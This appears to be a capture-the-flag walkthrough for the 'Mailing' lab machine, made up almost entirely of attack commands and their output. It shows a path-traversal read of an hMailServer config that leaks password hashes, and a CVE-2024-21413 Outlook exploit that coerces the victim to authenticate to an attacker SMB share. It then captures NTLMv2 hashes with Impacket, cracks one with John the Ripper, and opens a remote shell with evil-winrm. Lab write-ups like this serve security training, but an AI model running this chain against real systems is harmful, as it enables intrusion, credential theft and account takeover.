

```
http://mailing.htb/download.php?file=..\..\Program+Files+(x86)\hmailserver\Bin\hmailserver.ini
```


```
administrator:homenetworkingadministrator
```


```
kali@kali ~/Downloads> cat hmailserver.ini
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1

```


https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

```
kali@kali ~/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability (main)> python3 CVE-2024-21413.py --server "mailing.htb" --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url "\\10.10.14.2\test\poc.txt!something" --subject "testing"

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.

```


```
kali@kali ~> impacket-smbserver -smb2support test /home/kali/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.14,58600)
[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
[*] User MAILING\maya authenticated successfully
[*] maya::MAILING:aaaaaaaaaaaaaaaa:92e51c04323f5fe8a8a40c28f03dbd8a:0101000000000000005d43c1f5b2da0198fc62a3de0333e7000000000100100055004a00560050004c005700680065000300100055004a00560050004c0057006800650002001000630070007a00590067004a0055005a0004001000630070007a00590067004a0055005a0007000800005d43c1f5b2da01060004000200000008003000300000000000000000000000002000004b71e4ddeb21f7236989f8d30e0f737ef1d3df99825346ef952cdcaec89e26e30a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:test)
[*] NetrGetShareInfo Level: 1
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:test)
[*] Closing down connection (10.10.11.14,58600)
[*] Remaining connections []
[*] Incoming connection (10.10.11.14,58601)
[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
[*] User MAILING\maya authenticated successfully
[*] maya::MAILING:aaaaaaaaaaaaaaaa:7cf372a4f967fb596a372acba888923f:01010000000000000068aedcf5b2da0150c12e040d6e2c36000000000100100055004a00560050004c005700680065000300100055004a00560050004c0057006800650002001000630070007a00590067004a0055005a0004001000630070007a00590067004a0055005a00070008000068aedcf5b2da01060004000200000008003000300000000000000000000000002000004b71e4ddeb21f7236989f8d30e0f737ef1d3df99825346ef952cdcaec89e26e30a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000
[*] Connecting Share(1:test)
[*] Connecting Share(2:IPC$)
[*] NetrGetShareInfo Level: 1
[*] Disconnecting Share(2:IPC$)
[*] Disconnecting Share(1:test)
[*] Closing down connection (10.10.11.14,58601)
[*] Remaining connections []
[*] Incoming connection (10.10.11.14,58604)
[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
[*] User MAILING\maya authenticated successfully
[*] maya::MAILING:aaaaaaaaaaaaaaaa:4e044de534ae4969ec061bd469b4f242:01010000000000008009b2f8f5b2da01b4c8d2ed5bca0d33000000000100100055004a00560050004c005700680065000300100055004a00560050004c0057006800650002001000630070007a00590067004a0055005a0004001000630070007a00590067004a0055005a00070008008009b2f8f5b2da01060004000200000008003000300000000000000000000000002000004b71e4ddeb21f7236989f8d30e0f737ef1d3df99825346ef952cdcaec89e26e30a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000

```



```sh
kali@kali ~> john --format=netntlmv2  -w=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m4y4ngs4ri       (maya)  <--------------------------------------------------- password
1g 0:00:00:04 DONE (2024-05-30 21:27) 0.2100g/s 1246Kp/s 1246Kc/s 1246KC/s m61405..m4895621
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```


```
kali@kali ~> evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> dir

```


```
*Evil-WinRM* PS C:\Users\maya> tree /a /f
Folder PATH listing
Volume serial number is 9502-BA18
C:.
+---3D Objects
+---Contacts
+---Desktop
|       Microsoft Edge.lnk
|       user.txt
|
+---Documents
|   |   mail.py
|   |   mail.vbs
|   |
|   \---WindowsPowerShell
|       \---Scripts
|           \---InstalledScriptInfos
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---OneDrive
+---Pictures
|   +---Camera Roll
|   \---Saved Pictures
+---Saved Games
+---Searches
|       winrt--{S-1-5-21-3356585197-584674788-3201212231-1002}-.searchconnector-ms
|
\---Videos
    \---Captures

```